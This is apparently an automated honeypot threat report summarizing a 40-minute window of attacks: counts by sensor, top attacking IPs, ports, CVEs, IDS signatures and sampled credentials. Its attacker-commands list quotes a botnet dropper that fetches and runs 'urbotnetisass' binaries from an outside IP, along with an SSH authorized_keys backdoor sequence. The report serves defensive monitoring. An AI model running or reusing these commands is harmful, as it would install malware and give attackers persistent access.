
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-24T17:01:37Z
**Timeframe:** 2025-10-24T16:20:02Z to 2025-10-24T17:00:01Z
**Files Used:**
- agg_log_20251024T162002Z.json
- agg_log_20251024T164001Z.json
- agg_log_20251024T170001Z.json

## Executive Summary

This report summarizes 23,118 events collected from the honeypot network. The majority of attacks were captured by the Dionaea honeypot, with a significant number of events also recorded by Honeytrap and Suricata. The most targeted port was 445/TCP (SMB), and the most active attacking IP address was 114.47.12.143. A number of CVEs were detected, with CVE-2021-44228 (Log4Shell) being the most frequent. Attackers attempted a variety of commands, including efforts to download and execute malicious payloads.

## Detailed Analysis

### Attacks by Honeypot
- **Dionaea:** 11263
- **Honeytrap:** 4386
- **Suricata:** 3820
- **Ciscoasa:** 1820
- **Cowrie:** 1379
- **Sentrypeer:** 175
- **Redishoneypot:** 114
- **Mailoney:** 65
- **ConPot:** 19
- **Tanner:** 21
- **H0neytr4p:** 22
- **Adbhoney:** 10
- **Dicompot:** 6
- **ElasticPot:** 9
- **Ipphoney:** 6
- **Honeyaml:** 3

### Top Attacking IPs
- **114.47.12.143:** 11202
- **109.205.211.9:** 2519
- **80.94.95.238:** 1551
- **107.170.36.5:** 250
- **182.18.139.237:** 198
- **121.224.78.164:** 164
- **103.48.192.48:** 125
- **77.83.207.203:** 135
- **167.250.224.25:** 130
- **118.193.61.149:** 89
- **14.103.127.80:** 86
- **206.189.83.92:** 78
- **68.183.149.135:** 108
- **68.183.207.213:** 64
- **198.23.238.154:** 63

### Top Targeted Ports/Protocols
- **445:** 11221
- **8531:** 302
- **8530:** 301
- **22:** 221
- **5060:** 175
- **8333:** 120
- **5903:** 133
- **6379:** 114
- **5901:** 116
- **25:** 65
- **9092:** 56
- **5905:** 78
- **5904:** 76
- **23:** 56
- **5907:** 52
- **5908:** 50
- **5909:** 49

### Most Common CVEs
- CVE-2021-44228
- CVE-2019-11500
- CVE-2021-3449
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517

### Commands Attempted by Attackers
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; curl http://94.154.35.154/arm.urbotnetisass -O; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android; ...
- system
- shell
- q
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | wc -l
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname
- uname -a
- whoami
- lscpu | grep Model
- Enter new UNIX password: 
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'

### Signatures Triggered
- **ET SCAN MS Terminal Server Traffic on Non-standard Port:** 2077
- **ET HUNTING RDP Authentication Bypass Attempt:** 682
- **ET DROP Dshield Block Listed Source group 1:** 306
- **ET SCAN NMAP -sS window 1024:** 185
- **ET INFO Reserved Internal IP Traffic:** 61
- **ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication:** 25
- **ET DROP Spamhaus DROP Listed Traffic Inbound group 28:** 22
- **ET INFO CURL User Agent:** 13
- **ET CINS Active Threat Intelligence Poor Reputation IP group 86:** 8
- **GPL MISC source port 53 to <1024:** 6

### Users / Login Attempts
- root/Doomsday1005
- root/DormaFin1328!
- root/dorna3391000
- root/dotFixmeyn-!32
- root/doyzewiwat
- root/dragon322AdminPassword215
- User-Agent: Mozilla/5.0 (compatible; CyberOKInspect/1.0; +https://www.cyberok.ru/policy.html)/
- user/nKgp!ThaSniOwLr*
- user/nG^AP8Lk9dhG
- user/mw5Dp>c;ls!63oDHja
- user/mlwr7u8d@
- user/mFlem$XTb8@
- gmodserver/1
- and many others...

### Files Uploaded/Downloaded
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass

### HTTP User-Agents
- No HTTP User-Agents were recorded in the logs.

### SSH Clients and Servers
- No specific SSH clients or servers were identified in the logs.

### Top Attacker AS Organizations
- No attacker AS organizations were recorded in the logs.

## Key Observations and Anomalies
- The overwhelming majority of attacks are automated and opportunistic, focusing on common vulnerabilities and weak credentials.
- The IP address `114.47.12.143` is responsible for a large volume of the traffic, primarily targeting SMB on port 445. This suggests a widespread scanning or worm-like activity.
- The commands executed by attackers indicate attempts to download and run malicious binaries for various architectures (ARM, x86, MIPS), likely to build a botnet.
- The presence of commands to manipulate SSH authorized_keys files is a common technique for attackers to maintain persistent access to compromised systems.
- The CVEs detected, such as Log4Shell (CVE-2021-44228), are well-known and have been widely exploited, indicating that attackers are still finding unpatched systems.
